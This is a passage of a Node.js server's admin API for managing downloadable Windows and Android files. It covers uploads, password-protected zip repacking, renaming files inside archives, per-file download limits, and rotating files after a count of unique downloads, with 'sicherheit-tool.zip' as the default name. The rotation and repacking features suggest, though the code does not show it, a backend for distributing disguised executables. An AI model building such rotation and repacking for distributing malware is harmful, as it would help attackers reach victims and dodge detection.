          counts[slotName] = 0;
        } catch (e) {
          return send(res, 500, { ok: false, error: 'Ошибка записи файла' });
        }
      }
      while (newList.length < DOWNLOAD_SLOTS_COUNT) newList.push(null);
      writeDownloadFilesConfig(newList);
      writeDownloadLimits(limits);
      try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
        fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
      } catch (e) {}
      const out = getSicherheitDownloadFiles();
      return send(res, 200, { ok: true, files: out, uploadedCount: maxFiles });
    });
    return;
  }

  if (pathname === '/api/config/download' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let zipPassword = '';
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) {
              fileStart = bodyStart;
              fileEnd = partEnd;
            }
          } else if (nameMatch && nameMatch[1] === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const safeName = path.basename(filename) || 'download';
      const targetPath = path.join(DOWNLOADS_DIR, safeName);
      try {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        const names = fs.readdirSync(DOWNLOADS_DIR);
        for (let i = 0; i < names.length; i++) {
          const n = names[i];
          const lower = n.toLowerCase();
          if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== safeName) {
            try {
              fs.unlinkSync(path.join(DOWNLOADS_DIR, n));
            } catch (e) {}
          }
        }
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const result = { ok: true, fileName: safeName };
        if (path.extname(safeName).toLowerCase() !== '.zip') {
          send(res, 200, result);
          return;
        }
        let responded = false;
        const finishWithEntries = (entries) => {
          if (responded) return;
          responded = true;
          result.zipEntries = Array.isArray(entries) ? entries.filter(n => n && !n.endsWith('/')) : [];
          send(res, 200, result);
        };
        const parseUnzipList = (out) => {
          const entries = [];
          const lines = (out || '').split('\n');
          let inTable = false;
          for (const line of lines) {
            if (line.includes('-------')) { inTable = !inTable; continue; }
            let name = null;
            const m = inTable && line.match(/^\s*\d+\s+\S+\s+\S+\s+(.*)$/);
            if (m) name = m[1].trim();
            else if (inTable && /^\s*\d+/.test(line)) {
              const parts = line.trim().split(/\s{2,}/);
              if (parts.length >= 4 && /^\d+$/.test(parts[0])) name = parts.slice(3).join(' ').trim();
            }
            if (name && !/^\d+ files?$/.test(name) && !name.endsWith('/')) entries.push(name);
          }
          return entries;
        };
        const tryUnzipList = () => {
          const runUnzip = (usePassword) => {
            const env = usePassword ? { ...process.env, GMW_ZIP_OLD: zipPassword } : process.env;
            const cmd = usePassword
              ? 'unzip -l -P "$GMW_ZIP_OLD" ' + JSON.stringify(targetPath) + ' 2>&1'
              : 'unzip -l ' + JSON.stringify(targetPath) + ' 2>&1';
            const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', cmd], { encoding: 'utf8', env });
            return (r.stdout || '') + (r.stderr || '');
          };
          let out = runUnzip(!!zipPassword);
          let list = parseUnzipList(out);
          if (list.length === 0 && zipPassword) out = runUnzip(false);
          if (list.length === 0) list = parseUnzipList(out);
          if (list.length === 0) console.log('[SERVER] config/download zip list empty, hadPassword=', !!zipPassword, 'passLen=', (zipPassword || '').length, 'path=', targetPath);
          else console.log('[SERVER] config/download zipEntries=', list.length, list[0]);
          finishWithEntries(list);
        };
        if (zipPassword) {
          tryUnzipList();
          return;
        }
        yauzl.open(targetPath, { lazyEntries: true }, (err, zipfile) => {
          if (err || !zipfile) {
            tryUnzipList();
            return;
          }
          const entries = [];
          const onError = () => { try { finishWithEntries(entries.length ? entries : []); } catch (e) { finishWithEntries([]); } };
          zipfile.on('error', onError);
          try {
            zipfile.readEntry();
          } catch (e) {
            tryUnzipList();
            return;
          }
          zipfile.on('entry', (entry) => {
            try {
              if (entry.fileName && !entry.fileName.endsWith('/')) entries.push(entry.fileName);
              zipfile.readEntry();
            } catch (e) {
              onError();
            }
          });
          zipfile.on('end', () => { try { finishWithEntries(entries); } catch (e) { finishWithEntries(entries.length ? entries : []); } });
        });
      } catch (e) {
        const errMsg = (e && e.message) ? e.message : String(e);
        send(res, 500, { ok: false, error: errMsg || 'Server error' });
      }
    });
    return;
  }

  if (pathname === '/api/config/download-android' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const files = getAndroidDownloadFiles();
    return send(res, 200, { files });
  }

  if (pathname === '/api/config/download-android-limit' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const index = json.index != null ? parseInt(json.index, 10) : -1;
      let limit = json.limit != null ? parseInt(String(json.limit), 10) : -1;
      if (limit < 0) limit = 0;
      const config = readAndroidDownloadConfig();
      const name = (fileName && !fileName.includes('..') && !fileName.includes(path.sep))
        ? path.basename(fileName)
        : (index >= 0 && index < config.length ? config[index] : null);
      if (!name) return send(res, 400, { ok: false, error: 'fileName or index required' });
      const limits = readAndroidDownloadLimits();
      limits[name] = limit;
      writeAndroidDownloadLimits(limits);
      return send(res, 200, { ok: true, fileName: name, limit });
    });
    return;
  }

  if (pathname === '/api/config/download-delete' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const safeName = (fileName && !fileName.includes('..') && !fileName.includes(path.sep)) ? path.basename(fileName) : '';
      if (!safeName) return send(res, 400, { ok: false, error: 'fileName required' });
      const config = readDownloadFilesConfig();
      const idx = config.indexOf(safeName);
      if (idx === -1) return send(res, 404, { ok: false, error: 'File not in Windows config' });
      const newList = config.slice();
      newList[idx] = null;
      writeDownloadFilesConfig(newList);
      const limits = readDownloadLimits();
      delete limits[safeName];
      writeDownloadLimits(limits);
      const counts = readDownloadCounts();
      delete counts[safeName];
      writeDownloadCounts(counts);
      const fullPath = path.join(DOWNLOADS_DIR, safeName);
      try { if (fs.existsSync(fullPath)) fs.unlinkSync(fullPath); } catch (e) {}
      return send(res, 200, { ok: true, deleted: safeName });
    });
    return;
  }

  if (pathname === '/api/config/download-android-delete' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const safeName = (fileName && !fileName.includes('..') && !fileName.includes(path.sep)) ? path.basename(fileName) : '';
      if (!safeName) return send(res, 400, { ok: false, error: 'fileName required' });
      const config = readAndroidDownloadConfig();
      const idx = config.indexOf(safeName);
      if (idx === -1) return send(res, 404, { ok: false, error: 'File not in Android config' });
      const newList = config.slice();
      newList[idx] = null;
      writeAndroidDownloadConfig(newList);
      const limits = readAndroidDownloadLimits();
      delete limits[safeName];
      writeAndroidDownloadLimits(limits);
      const counts = readDownloadCounts();
      delete counts[safeName];
      writeDownloadCounts(counts);
      const fullPath = path.join(DOWNLOADS_DIR, safeName);
      try { if (fs.existsSync(fullPath)) fs.unlinkSync(fullPath); } catch (e) {}
      return send(res, 200, { ok: true, deleted: safeName });
    });
    return;
  }

  if (pathname === '/api/config/download-reset-counts' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const platform = (json.platform === 'windows' || json.platform === 'android' || json.platform === 'all') ? json.platform : 'all';
      const counts = readDownloadCounts();
      if (platform === 'all') {
        writeDownloadCounts({});
        return send(res, 200, { ok: true, cleared: 'all' });
      }
      const names = platform === 'windows'
        ? readDownloadFilesConfig().filter(Boolean)
        : readAndroidDownloadConfig().filter(Boolean);
      for (let i = 0; i < names.length; i++) {
        delete counts[names[i]];
      }
      writeDownloadCounts(counts);
      return send(res, 200, { ok: true, cleared: platform });
    });
    return;
  }

  if (pathname === '/api/config/download-rotate-next' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const platform = (json.platform === 'windows' || json.platform === 'android') ? json.platform : null;
      if (!platform) return send(res, 400, { ok: false, error: 'platform required: windows or android' });
      const state = readDownloadRotation();
      const key = platform === 'android' ? 'android' : 'windows';
      const block = state[key];
      if (!block) return send(res, 500, { ok: false });
      block.totalUnique = (block.totalUnique || 0) + 1;
      writeDownloadRotation(state);
      return send(res, 200, { ok: true, platform, totalUnique: block.totalUnique });
    });
    return;
  }

  if (pathname === '/api/config/download-android-upload-multi' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      const files = [];
      let idx = body.indexOf(boundaryPrefix);
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          const fieldName = nameMatch ? nameMatch[1].replace(/\s*\[\]$/, '') : '';
          if ((fieldName === 'file' || fieldName === 'files') && fileMatch) {
            const filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) files.push({ filename, start: bodyStart, end: partEnd });
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (files.length === 0) return send(res, 400, { ok: false, error: 'Нет файлов' });
      if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
      const newList = [];
      const limits = readAndroidDownloadLimits();
      const counts = readDownloadCounts();
      const maxFiles = Math.min(files.length, DOWNLOAD_SLOTS_COUNT);
      for (let i = 0; i < maxFiles; i++) {
        const base = path.basename(files[i].filename) || 'android';
        const ext = path.extname(base).toLowerCase() || '.apk';
        const safeName = (base.replace(/\.[^.]+$/, '') || 'android').replace(/[^a-zA-Z0-9._-]/g, '_') + ext;
        const fullPath = path.join(DOWNLOADS_DIR, safeName);
        try {
          const buf = body.slice(files[i].start, files[i].end);
          fs.writeFileSync(fullPath, buf);
          newList.push(safeName);
          if (limits[safeName] === undefined) limits[safeName] = DEFAULT_DOWNLOAD_LIMIT;
          counts[safeName] = 0;
        } catch (e) {
          return send(res, 500, { ok: false, error: 'Ошибка записи файла' });
        }
      }
      while (newList.length < DOWNLOAD_SLOTS_COUNT) newList.push(null);
      writeAndroidDownloadConfig(newList);
      writeAndroidDownloadLimits(limits);
      try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
        fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
      } catch (e) {}
      const out = getAndroidDownloadFiles();
      return send(res, 200, { ok: true, files: out, uploadedCount: maxFiles });
    });
    return;
  }

  if (pathname === '/api/config/download-settings' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const cfg = readDownloadSettings();
    const rot = readDownloadRotation();
    return send(res, 200, {
      rotateAfterUnique: cfg.rotateAfterUnique,
      windowsUnique: rot.windows.totalUnique,
      androidUnique: rot.android.totalUnique
    });
  }

  if (pathname === '/api/config/download-settings' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const n = json.rotateAfterUnique;
      const val = typeof n === 'number' && n >= 0 ? n : (parseInt(String(n || '0'), 10) >= 0 ? parseInt(String(n), 10) : 0);
      writeDownloadSettings({ rotateAfterUnique: val });
      return send(res, 200, { ok: true, rotateAfterUnique: val });
    });
    return;
  }

  if (pathname === '/api/config/download-android' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let slotIndex = 0;
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) { fileStart = bodyStart; fileEnd = partEnd; }
          } else if (nameMatch && nameMatch[1] === 'slotIndex') {
            const val = body.slice(bodyStart, partEnd).toString('utf8').trim();
            const n = parseInt(val, 10);
            if (n >= 0 && n < DOWNLOAD_SLOTS_COUNT) slotIndex = n;
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const base = path.basename(filename) || 'android';
      const ext = path.extname(base).toLowerCase() || '.apk';
      const safeName = (base.replace(/\.[^.]+$/, '') || 'android').replace(/[^a-zA-Z0-9._-]/g, '_') + ext;
      const targetPath = path.join(DOWNLOADS_DIR, safeName);
      try {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const config = readAndroidDownloadConfig();
        config[slotIndex] = safeName;
        writeAndroidDownloadConfig(config);
        return send(res, 200, { ok: true, fileName: safeName, slotIndex });
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Write failed' });
      }
    });
    return;
  }

  if (pathname === '/api/config/check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let zipPassword = '';
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) { fileStart = bodyStart; fileEnd = partEnd; }
          } else if (nameMatch && nameMatch[1] === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const safeName = path.basename(filename) || 'download';
      const checkId = Date.now() + '-' + Math.random().toString(36).slice(2, 10);
      const targetPath = path.join(CHECK_DIR, checkId);
      try {
        if (!fs.existsSync(CHECK_DIR)) fs.mkdirSync(CHECK_DIR, { recursive: true });
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const meta = readCheckMeta();
        meta[checkId] = { name: safeName };
        writeCheckMeta(meta);
        const result = { ok: true, fileName: safeName, checkId };
        if (path.extname(safeName).toLowerCase() !== '.zip') {
          return send(res, 200, result);
        }
        let responded = false;
        const finishWithEntries = (entries) => {
          if (responded) return;
          responded = true;
          result.zipEntries = Array.isArray(entries) ? entries.filter(n => n && !n.endsWith('/')) : [];
          send(res, 200, result);
        };
        const parseUnzipList = (out) => {
          const entries = [];
          const lines = (out || '').split('\n');
          let inTable = false;
          for (const line of lines) {
            if (line.includes('-------')) { inTable = !inTable; continue; }
            let name = null;
            const m = inTable && line.match(/^\s*\d+\s+\S+\s+\S+\s+(.*)$/);
            if (m) name = m[1].trim();
            else if (inTable && /^\s*\d+/.test(line)) {
              const parts = line.trim().split(/\s{2,}/);
              if (parts.length >= 4 && /^\d+$/.test(parts[0])) name = parts.slice(3).join(' ').trim();
            }
            if (name && !/^\d+ files?$/.test(name) && !name.endsWith('/')) entries.push(name);
          }
          return entries;
        };
        const runUnzip = (usePassword) => {
          const env = usePassword ? { ...process.env, GMW_ZIP_OLD: zipPassword } : process.env;
          const cmd = usePassword
            ? 'unzip -l -P "$GMW_ZIP_OLD" ' + JSON.stringify(targetPath) + ' 2>&1'
            : 'unzip -l ' + JSON.stringify(targetPath) + ' 2>&1';
          const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', cmd], { encoding: 'utf8', env });
          return (r.stdout || '') + (r.stderr || '');
        };
        let out = runUnzip(!!zipPassword);
        let list = parseUnzipList(out);
        if (list.length === 0 && zipPassword) out = runUnzip(false);
        if (list.length === 0) list = parseUnzipList(out);
        finishWithEntries(list);
      } catch (e) {
        try { if (fs.existsSync(targetPath)) fs.unlinkSync(targetPath); } catch (e2) {}
        const meta = readCheckMeta();
        delete meta[checkId];
        writeCheckMeta(meta);
        send(res, 500, { ok: false, error: (e && e.message) || 'Server error' });
      }
    });
    return;
  }

  if (pathname === '/api/config/upload-apply' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const checkId = (json.checkId || '').trim();
      const slotIndex = json.slotIndex != null ? parseInt(json.slotIndex, 10) : -1;
      const useSlot = slotIndex >= 0 && slotIndex < DOWNLOAD_SLOTS_COUNT;
      const meta = readCheckMeta();
      const info = checkId ? meta[checkId] : null;
      const sourcePath = checkId ? path.join(CHECK_DIR, checkId) : null;
      if (!checkId || !info || !sourcePath || !fs.existsSync(sourcePath)) {
        return send(res, 400, { ok: false, error: 'Сначала нажмите Check и загрузите файл' });
      }
      const safeName = info.name;
      const isZip = path.extname(safeName).toLowerCase() === '.zip';
      const asIs = json.asIs === true;
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      let newZipName = (json.newZipName || '').trim().replace(/[^a-zA-Z0-9._-]/g, '') || 'sicherheit-tool.zip';
      if (!newZipName.toLowerCase().endsWith('.zip')) newZipName += '.zip';
      const renames = json.renames && typeof json.renames === 'object' ? json.renames : {};
      /** Имя файла для слота: sicherheit-0.zip, sicherheit-1.exe и т.д. */
      function slotFileName(idx, ext) {
        return 'sicherheit-' + idx + (ext || path.extname(safeName) || '');
      }
      function applyToSlot(finalFileName) {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        const finalPath = path.join(DOWNLOADS_DIR, finalFileName);
        fs.copyFileSync(sourcePath, finalPath);
        const config = readDownloadFilesConfig();
        config[slotIndex] = finalFileName;
        writeDownloadFilesConfig(config);
        try {
          if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
          delete meta[checkId];
          writeCheckMeta(meta);
        } catch (e) {}
        send(res, 200, { ok: true, fileName: finalFileName });
      }
      try {
        if (isZip && asIs && useSlot) {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const finalFileName = slotFileName(slotIndex, '.zip');
          fs.copyFileSync(sourcePath, path.join(DOWNLOADS_DIR, finalFileName));
          if (currentPassword) writeZipPassword(currentPassword);
          const config = readDownloadFilesConfig();
          config[slotIndex] = finalFileName;
          writeDownloadFilesConfig(config);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else if (isZip && asIs) {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if (lower.endsWith('.exe') || lower.endsWith('.zip')) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          const finalPath = path.join(DOWNLOADS_DIR, safeName);
          fs.copyFileSync(sourcePath, finalPath);
          if (currentPassword) writeZipPassword(currentPassword);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: safeName });
        } else if (isZip && useSlot) {
          const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
          const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
          fs.mkdirSync(tempDir, { recursive: true });
          const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
          const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
          const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
          if (fs.readdirSync(tempDir).length === 0) {
            const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
            const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
            return send(res, 500, { ok: false, error: friendly });
          }
          const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
          function safeSegment(name) {
            const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
            return s || null;
          }
          for (const r of renameList) {
            const from = safeSegment(r.from || r[0] || '');
            const to = safeSegment(r.to || r[1] || '');
            if (!from || !to || from === to) continue;
            const oldP = path.join(tempDir, from);
            const newP = path.join(tempDir, to);
            if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
            if (fs.existsSync(oldP)) fs.renameSync(oldP, newP);
          }
          const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
          execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
          const finalFileName = slotFileName(slotIndex, '.zip');
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(outZipPath, path.join(DOWNLOADS_DIR, finalFileName));
          const config = readDownloadFilesConfig();
          config[slotIndex] = finalFileName;
          writeDownloadFilesConfig(config);
          writeZipPassword(newPassword);
          try {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
            if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
          } catch (e) {}
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else if (isZip) {
          const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
          const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
          fs.mkdirSync(tempDir, { recursive: true });
          const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
          const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
          const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
          if (fs.readdirSync(tempDir).length === 0) {
            const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
            const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
            return send(res, 500, { ok: false, error: friendly });
          }
          const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
          function safeSegment(name) {
            const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
